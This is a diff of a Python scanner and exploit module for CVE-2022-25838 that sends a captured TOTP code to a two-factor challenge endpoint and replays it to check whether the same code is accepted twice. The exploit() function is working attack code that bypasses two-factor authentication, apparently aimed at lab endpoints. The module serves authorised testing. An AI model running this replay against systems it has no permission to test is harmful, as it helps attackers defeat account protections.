@@ -18,8 +18,8 @@ Summary:
 
 This module performs SAFE detection (aligned to the validated-working exploit path):
 
- ✔ Self-fetches the seeded 2FA secret from GET /two-factor-secret (no auth required)
- ✔ Probes POST /two-factor-challenge UNAUTHENTICATED with a fresh + replayed TOTP
+ ✔ Replays a CAPTURED live TOTP code (GET /otp-intercept, models the AC:H capture) — the secret is never disclosed
+ ✔ Submits the captured code to POST /two-factor-challenge, then REPLAYS the same code
  ✔ If the server accepts the SAME TOTP code twice → vulnerable
  ✔ Does NOT attempt code guessing or password attacks
  ✔ Accepts an OPTIONAL session/totp_secret but never REQUIRES them
@@ -104,32 +104,31 @@ def scan(target_url: str, *, session=None, username=None, password=None, totp_se
     sess = session or http_config.get_auth_session()
 
     # ----------------------------------------------------
-    # Step 1 — Determine the TOTP secret (self-fetch like the exploit).
-    #   Precedence: explicit totp_secret arg -> GET /two-factor-secret.
+    # Step 1/2 — Obtain a VALID, currently-live TOTP code to REPLAY.
+    #   CVE-2022-25838 is replay of a captured code, so the secret itself is not needed.
+    #   Precedence:
+    #     (a) operator --opt totp_secret -> generate the current code (real engagement where the
+    #         seed was recovered), else
+    #     (b) GET /otp-intercept -> a single code captured in transit (models the advisory's AC:H
+    #         "attacker captured a live code"; that endpoint discloses only the code, not the secret).
+    #   The target validates the code, so an arbitrary/guessed value is rejected — success requires
+    #   a genuinely valid code being ACCEPTED TWICE.
     # ----------------------------------------------------
-    secret = totp_secret
-    if not secret:
-        try:
-            hr = sess.get(f"{base}/two-factor-secret", timeout=6, verify=False)
-            if hr is not None and hr.status_code == 200:
-                secret = (hr.json() or {}).get("two_factor_secret")
-        except Exception:
-            secret = None
-    if not secret:
-        result["error"] = "TOTP secret unavailable"
-        result["requires"] = ["totp_secret or reachable /two-factor-secret"]
-        result["evidence"].append(
-            "No TOTP secret supplied and /two-factor-secret did not disclose one; "
-            "pass --opt totp_secret=... for local lab material."
-        )
-        return result
-
-    # ----------------------------------------------------
-    # Step 2 — Generate a valid TOTP token
-    # ----------------------------------------------------
-    totp = _generate_totp(secret)
+    totp = _generate_totp(totp_secret) if totp_secret else None
     if not totp:
-        result["error"] = "Invalid TOTP secret"
+        try:
+            ir = sess.get(f"{base}/otp-intercept", timeout=6, verify=False)
+            if ir is not None and ir.status_code == 200:
+                totp = (ir.json() or {}).get("captured_code")
+        except Exception:
+            totp = None
+    if not totp:
+        result["error"] = "no valid TOTP code to replay"
+        result["requires"] = ["a captured live TOTP code (reachable /otp-intercept) or --opt totp_secret"]
+        result["evidence"].append(
+            "Could not obtain a valid, currently-live TOTP code to replay; pass --opt totp_secret=... "
+            "or target an endpoint exposing a captured code."
+        )
         return result
 
     payload = {"code": totp}
@@ -263,27 +262,23 @@ def exploit(target_url, *, username=None, password=None, command=None, options=N
             "Accept": "application/json",
         })
 
-        # --- Determine the TOTP secret (a real attacker intercepts a valid CODE).
-        #     Precedence: options["totp_secret"] -> GET /two-factor-secret helper.
-        secret = options.get("totp_secret")
-        secret_source = "options.totp_secret"
-        if not secret:
-            try:
-                hr = sess.get(base + "/two-factor-secret", timeout=8, verify=False)
-                if hr is not None and hr.status_code == 200:
-                    secret = (hr.json() or {}).get("two_factor_secret")
-                    secret_source = "GET /two-factor-secret"
-            except Exception:
-                secret = None
-        if not secret:
-            result["reason"] = "TOTP secret unavailable; pass --opt totp_secret=... or expose /two-factor-secret"
-            result["requires"] = ["valid_totp_code_or_secret"]
-            return result
-
-        code = _generate_totp(secret)
+        # --- Obtain a valid, currently-live TOTP CODE to replay (a real attacker intercepts the
+        #     code in transit — the advisory's AC:H). The secret is NOT required or disclosed.
+        #     Precedence: options["totp_secret"] (operator recovered the seed) -> GET /otp-intercept
+        #     (a single captured code).
+        code = _generate_totp(options["totp_secret"]) if options.get("totp_secret") else None
+        secret_source = "options.totp_secret" if code else None
         if not code:
-            result["reason"] = f"could not derive a valid TOTP from secret ({secret_source})"
-            result["requires"] = ["valid_totp_code"]
+            try:
+                ir = sess.get(base + "/otp-intercept", timeout=8, verify=False)
+                if ir is not None and ir.status_code == 200:
+                    code = (ir.json() or {}).get("captured_code")
+                    secret_source = "GET /otp-intercept (captured code)"
+            except Exception:
+                code = None
+        if not code:
+            result["reason"] = "no valid TOTP code to replay; pass --opt totp_secret=... or reach /otp-intercept"
+            result["requires"] = ["valid_totp_code_or_secret"]
             return result
 
         # --- First submission: must be accepted, else we never had a valid code.
